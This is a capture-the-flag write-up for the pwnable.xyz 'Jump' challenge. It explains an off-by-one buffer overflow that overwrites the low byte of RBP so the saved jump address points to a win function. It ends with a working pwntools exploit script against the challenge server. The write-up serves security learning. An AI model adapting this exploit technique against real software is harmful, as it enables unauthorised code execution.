# Overview

```
Jump jump
The Mac Dad will make you jump jump
Daddy Mac will make you
jump jump
The Daddy makes you J-U-M-P

Menu:
1. J-U-M-P
2. How high
3. Ya you know me
>
```

Jump address is defined:

![image](https://user-images.githubusercontent.com/17574533/212992898-d3fd2013-0b76-4a55-8808-b4bca29260da.png)

By default it resets the program by jumping right after setting up the canary

`read_int8` is called to read user input

## Option 3
Prints the location of environment variables.

Decompiled in Ghidra:

![image](https://user-images.githubusercontent.com/17574533/212993116-fd7f5f00-0971-462c-84e3-417f4c8c964c.png)

Program output: 

![image](https://user-images.githubusercontent.com/17574533/212994648-1818400d-8353-443d-b00c-4f01c1daf209.png)


## Option 2
XORs the jump address with 2.

Decompiled in Ghidra:

![image](https://user-images.githubusercontent.com/17574533/212995268-a3f23c92-f493-4ef0-bdd1-268b6f4a98e3.png)

Program output (no printed output):

![image](https://user-images.githubusercontent.com/17574533/212995499-776e89d4-5023-49fc-83be-8db340218594.png)


## Option 1
Jumps to the jump address.

Decompiled in Ghidra:

![image](https://user-images.githubusercontent.com/17574533/212995750-f4531957-1a22-4ee8-a2ab-eeab8fd6fa37.png)

Program output:

![image](https://user-images.githubusercontent.com/17574533/212995841-fb421d87-d20f-44db-b075-f6bd4c77bfd2.png)


# Goal

Go to the `win` function which will print out the flag

![image](https://user-images.githubusercontent.com/17574533/213037865-b6596b60-50e1-4cfc-9ea7-ebc05b71ac57.png)


# Vulnerability

Buffer overflow: In `read_int8`, the `count` argument for `read` is not set properly. Should be 0x20 instead of 0x21.

![image](https://user-images.githubusercontent.com/17574533/213038159-b5f93215-9915-49bc-933b-6c8313ef6576.png)

This allows us to modify the lower byte of `main` RBP

| No Overflow | Overflow |
| - | - |
| ![image](https://user-images.githubusercontent.com/17574533/213045866-54eb17e0-241e-4f5c-a5c2-ca067c554089.png) | ![image](https://user-images.githubusercontent.com/17574533/213043169-95740bc8-3ee0-47a7-8319-b79dff99a74f.png) | 

# Observations

1. Option 1 jumps to `rbp - 0x8`:

![image](https://user-images.githubusercontent.com/17574533/213055337-62ffb1ad-1278-42e7-a696-bcfdfd54fe19.png)

2. After `read_int8`, the read value is stored in `rbp - 0x11`:

![image](https://user-images.githubusercontent.com/17574533/213055574-ecea95e6-e565-4216-800a-e362ade5ffcb.png)

3. The default jump address is `0x0000555555400ba0`

4. The win address is `0x0000555555400b77`

5. The distance between `rbp` and the environment variables is constant

By setting `rbp += 0x9` through buffer overflow, observation 2 will overwrite the lower byte of the jump address `rbp - 0x8`

This is enough since the win and default jump address only differs by 1 byte

# Exploit
1. Print the address of environment variables with Option 3
2. Calculate `rbp` of `main` = `envar_addr` - `offset`
3. Increase `rbp` by 9 through buffer overflow
4. Change lower byte of jump address to 0x77 (address of `win`)
5. Restore `rbp` through buffer overflow so the canary works properly
6. Jump to `win` with Option 1

`offset` is 248 on pwnable.xyz's machine.
- 376 on my WSL Ubuntu 22.04
- 296 on my Linode Ubuntu 22.04
- 264 on my new WSL Ubuntu 20.04

## Code

``` python
from pwn import *

p = remote('svc.pwnable.xyz', 30012)
rbp_offset = 248

p.sendafter(b'>', b'3')
env_addr = int(p.recvline().strip(), base=16)
rbp_addr = env_addr - rbp_offset
rbp_byte = rbp_addr & 0xff
win_byte = 0x0010b77 & 0xff

p.sendafter(b'>', b'A' * 32 + p8(rbp_byte + 9)) # Change rbp
p.sendafter(b'>', str(win_byte).encode()) # Write address to jump
p.sendafter(b'>', b'A' * 32 + p8(rbp_byte)) # Revert rbp
p.sendafter(b'>', b'1') # Jump

p.interactive()
```
